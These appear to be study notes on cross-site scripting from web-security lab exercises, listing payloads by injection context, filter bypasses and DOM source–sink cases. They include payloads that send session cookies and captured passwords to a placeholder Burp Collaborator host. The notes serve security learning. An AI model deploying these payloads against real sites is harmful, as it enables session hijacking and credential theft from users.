- If xss context is **within html tags** 
	- **with no encoding**
		- We can simply introduce the below payload to execute our javascript code.
		```html
		<script>alert(document.domain)</script>
		```  
	- **most tags and attributes blocked**
		- Make use of intruder to identify for any allowed tags and their event hanndlers. 
		- Use the allowed tags and attributes to execute javascript
		- For example, if **body** tag is allowed we can craft a payload with **iframe** to deliver to our victim
			- Browsers when rendering html only allow one *body* tag and merge any events related to inner body tags to the parent body tag. So, in our scenario if we try to inject a body tag with events into our search field, our inner body tag gets removed and the event gets added to the parent body tag.
		```html
		<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
		``` 
		- Another example when **only custom tags are allowed** we can craft a payload that will be automatically triggered on victims end: **`<script>location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';</script>`**
		- If the application **only allows svg** tag the our payload will be: **`<svg><animatetransform onbegin=alert(1) attributeName=transform>`**
		- If our vss context is within **canonical link tag** our payload would be: **`accesskey='x'onclick'alert(1)`**. **Make sure there are no spaces in our payload**.

> **🗒️ NOTE**
> When trying to find xss make sure to validate all instances of our input within the response. The application might not be implementing encoding or escaping on all those instances.

- If xss context is **into an attribute**
	- **angle brackets html encoded**
		```javascript
		" autofocus onfocus=alert(document.domain) x="
	   ```
		- We are adding **`x="`** to repair the markup from being broken
	- **double quotes encoded and input is within `href` attribute**
		- **`href`** is considered to be a scriptable context. There are other html attributes that act as scriptable contexts by themselves. 
		- We make use of javascript **pseudo-protocol** to execute our payload: 
		```javascript
		javascript:alert(document.domain)
		```

- If xss context is into **JavaScript**
	- **angle brackets html encoded**
		- If our input is within a string then we need to break out of it to introduce javascript code
			```javascript
			';alert(document.domain)//` 
			'-alert(document.domain)-'
		   ```
	- **single quote and backslash escaped**
		- Browsers first perform html parsing to idenfity page elements and then parse javascript to understand and execute embedded scripts.
		- Even though our payload breaks the markup it doesn't prevent the subsequent script from being parsed and executed in a normal way.
		- We can craft our payload using the above information: 
		  ```html
		  </script><img src=1 onerror=alert(document.domain)>;
		 ```
	- **angle brackets and double quotes html encoded and single quotes escaped**
		- To break out of the string we will append a **`\`** backslash character to our payload: **`\\';alert(document.domain)//`**
		- ***Here, the first backslash means that the second backslash is interpreted literally, and not as a special character. This means that the quote is now interpreted as a string terminator, and so the attack succeeds.***
	- **within existing javascript in a quoted tag attribute such as `onclick` event with `<>`, and `"` html encoded and `'`, and `\` escaped**
		- Consider and example: 
		```html
		<a href="#" onclick="... var input='controllable data here'; ...">
		```
		- To break out of the string and execute our payload we will make use of: 
		```javascript
		&apos;-alert(document.domain)-&apos;
		```
		- ***Browser's usually HTML-decode the value of the `onclick` attribute before the JavaScript is interpreted, the entities are decoded as quotes, which become string delimiters, and so the attack succeeds.***
	- **Using template literals \`\` (input within backticks) **
		- We can introduce **embedded expressions `${...}`** with javascript code inside: **`${alert(document.domain)}`**

- **Stealing session cookies**
	- Identify the xss context to craft our payload
	- Start burp collaborator and copy the payload url to clipboard
	- Use the following payload to deliver exploit to our victim: 
	```javascript
	<script> fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>
```

- **capturing passwords**
	- Identify xss context to craft our payload
	- Start burp collaborator and copy payload url to clipboard
	- Use the following payload to deliver exploit to our victim:
	```html
		<input name="username" id="username">
		<input type="password" name="password" onchange="if(this.value.length) fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
		   method: 'POST',
		   mode: 'no-cors',
		   body: username.value + ':' + this.value
		});">
	```
	- Browsers typically enforce **same-origin-policy** which restricts making a request to a different domain. To bypass this we set **mode: no-cors**.

### DOM XSS
- **source `location.search` and sink `document.write`**
	- **document.write allows executing `<script>` tags** and our payload will be:
	```html
		<script>alert(document.domain)</script>
	```
	- **terminating any strings** to excute our payload:
		1. consider our input is within:
		 ```javascript
			document.write('<img src="/resources/images/tracker.gif?searchTerms='+attacker controllable input+'">');
		```
		2. Our payload will now be:
		```html
			'"><script>alert(document.domain)</script>
	   ```
	- **terminating any tags** to execute our payload:
		1. consider our input is within:
		 ```javascript
			document.write('<select name="...attacker controllable input...">')
		```
		2. Our payload will now be:
		```html
		   "><script>alert(document.domain)</script>
	   ```
- **source `location.search` and sink `innerHTML`**
	- **innerHTML doesn't allow `<script>` tags**, alternatively we can use **`img`** tags to execute our code:
	```html
		<img src=1 onerror=alert(document.domain)>
	```
- **source `location.search` and sink jQuery anchor `href` attribute**
	- Consider an example where the value of **returnPath** is being set to a **href** attribute within an anchor tag which has an id **backLink**:
	```javascript
		<script>
			$(function() {
				$('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
			});
		</script>
	```
	- If the **returnPath** is **attacker controllable input** then we can use javascript **pseudo-protocol** to execute our payload:
	```javascript
		javascript:alert(document.domain)
	```
- **source `location.hash` and sink jQuery slection function `$()`**
	- Complete the lab again
- **angularJS expression with angle brackets and double quotes html encoded**
	- Complete the lab again
- **source `location.search` and sink `eval()`**
	- Consider an example where our input is reflected within a json response that will eventually get passed to an **`eval()`**
	- We will the following payload to break out of json and call our javascript code: 
	```javascript
		"-alert()}//
	```
- **When `replace` is used for sanitization**
	- Consider an example where our input is sanitized using the javascript function **`replace`** instead of **`replaceAll`**
	- If the function tries to replace **`<`** and **`>`** then we can craft a payload that would be: 
	```html
		<><img src=1 onerror=alert(1)>
	```
	